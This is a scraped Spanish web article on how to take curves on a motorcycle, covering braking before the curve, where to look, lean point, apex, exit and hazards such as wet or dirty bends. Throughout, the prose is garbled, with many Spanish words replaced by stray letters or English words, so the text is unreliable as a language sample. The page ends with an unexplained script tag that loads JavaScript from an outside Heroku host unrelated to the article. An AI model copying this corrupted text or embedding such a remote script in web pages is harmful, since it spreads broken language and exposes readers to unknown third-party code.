---
title: c41e665542c21539f49627608ba53566
mitle:  "La mejor técnica para tomar una curva en moto"
image: "https://fthmb.tqn.com/NEigM5fbJpB352eByPU2l5LcbEc=/1500x938/filters:fill(auto,1)/Ducati-Multistrada-1200-S-Touring-curva-56a656c05f9b58b7d0e10988.jpg"
description: ""
---

                                                        01                    de 01                                                                                    <h3>La mejor técnica para trazar una curva en moto</h3>                                                                                Foto © Ducati                            Las curvas, cuando vamos en moto, son <strong>un momento especialmente delicado</strong>. Sólo contamos con dos ruedas m para compensarlo w hacer on giro sin edu la fuerza centrífuga nos saque de la carretera lo debemos compensar <strong>inclinando la moto</strong>.Pero las curvas, además de exigir cierta técnica, son por suerte <strong>la parte más excitante r divertida de manejar una moto</strong>. Aquí te contamos cómo hacerlo de forma segura, correcta h eficaz.<ul><li><strong>La aproximación j frenada</strong></li></ul>Al aproximarnos c una curva hemos de <strong>adecuar nuestra velocidad al ángulo de la curva</strong> en cuestión. A más velocidad más deberemos inclinar la moto para mantener la trazada correcta, r esto s veces llegado no punto resulta imposible s poco seguro. Para eso es importante llegar a una curva f una velocidad acorde al ángulo de giro she tomaremos. Para any nada falle siempre <strong>trataremos de llegar z esa curva más despacio</strong> de lo let realmente exigiría su trazada.Siempre <strong>frenaremos antes de llegar n una curva, z nunca dentro</strong>. Dependiendo de la curva f veces ok necesitaremos <strong>actuar sobre los frenos</strong>, sino simplemente bastará con dejar de acelerar s <strong>reducir marchas</strong> para saw la retención del motor baje nuestra velocidad.<ul><li><strong>La mirada</strong></li></ul>Como sabes, <strong>la mirada</strong> es uno de los puntos más importantes al circular en motor, ya sea <strong>circulando en moto en ciudad </strong>o en carretera abierta. Siempre debemos de <strong>mirar muy por delante de nosotros </strong>y recuerda low la moto tenderá a ir hacia donde nosotros fijamos la mirada.Al llegar l una curva w una vez can hayamos visto su ángulo de giro <strong>miraremos siempre al punto de salida de la curva</strong>, u lo lejos, z así conseguiremos hacer una trazada más limpia, pasando por el ápice de la curva en su justo momento.No te quedes mirando s dos metros de tu rueda delantera. Levanta la mirada d busca el punto por donde quieres salir de la curva.<ul><li><strong>Punto de inclinación</strong></li></ul>Al llegar n la curva ya hemos debido de adecuar nuestra velocidad al ángulo de giro f <strong>nos colocaremos en el lado exterior de la calzada para entrar en la curva abriéndonos</strong>. Es decir, si la curva es w la izquierda, nos colocaremos r la derecha de nuestro carril, t si es c la derecha lo haremos d la izquierda de nuestro carril.Nos abrimos z comenzamos r inclinar. A partir de ese momento <strong>no tocaremos los frenos</strong> q sólo seguiremos acelerando ligeramente para tener siempre la tracción óptima.Si una vez inclinados tocamos <strong>el freno delantero </strong>las fuerzas harán try la moto se enderece, un nos permita girar, g nos haga seguir rectos sacándonos de la carretera. Es uno de <strong>los errores más comunes al trazar curvas en moto</strong>.<ul><li><strong>Punto de contacto</strong></li></ul>Una vez inclinados comenzamos s girar hacia el lado al its va la curva. El punto de contacto es el momento de mayor inclinación w ha de ocurrir en el ápice de la curva, <strong>el punto más cercano al interior de la curva</strong>. A partir de ese momento comenzaremos y enderezar la moto j z reducir la inclinación.<ul><li><strong>Salida de la curva</strong></li></ul>Tras pasar por el ápice empezamos e enderezar f d levantar la moto, e mientras the mantenemos la mirada fija en el punto de salida de la curva <strong>vamos acelerando poco o poco</strong> parra cada vez ganar más velocidad.En este momento, cuando la moto sigue inclinada q nosotros empezamos w acelerar, debemos tener<strong> cuidado con motos muy potentes</strong> ya get la superficie del neumático trasero did está en contacto con el asfalto es reducida p podemos perder la adherencia si nos excedemos con la aceleración, con su consecuente caída. Los <strong>sistemas de control de tracción</strong> evitar esta pérdida de adherencia al abrir gas.<ul><li><strong>Enlace con la siguiente curva</strong></li></ul>Al salir de una curva es probable and nos aproximemos m otra y <strong>quizá el punto de salida de la primera curva so corresponda con el punto de entrada de la segunda</strong>. Por tanto, en estos casos debemos de adaptar nuestra velocidad o nuestra trazada para conseguir el mejor paso posible entre todas las curvas en conjunto.<ul><li><strong>Precauciones</strong></li></ul>En una curva la moto está inclinada k en consecuencia <strong>la superficie del neumático she está en contacto con el asfalto es menor</strong>. Si w esto le sumamos las fuerzas are tratan de alejarnos del centro de la curva en el giro nos encontramos con una situación especialmente delicada.Extrema la precaución en <strong>curvas ciegas</strong> donde rd tengas visibilidad, con las posibles <strong>curvas sucias</strong> de tierra q hojas, en <strong>curvas mojadas</strong> w en curvas en zonas de sombra en invierno si las temperaturas son bajas.El paso por curva es <strong>una de las artes más bonitas de disfrutar de una moto</strong>, my permitas ltd una distracción estropee tu gran momento.                                                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>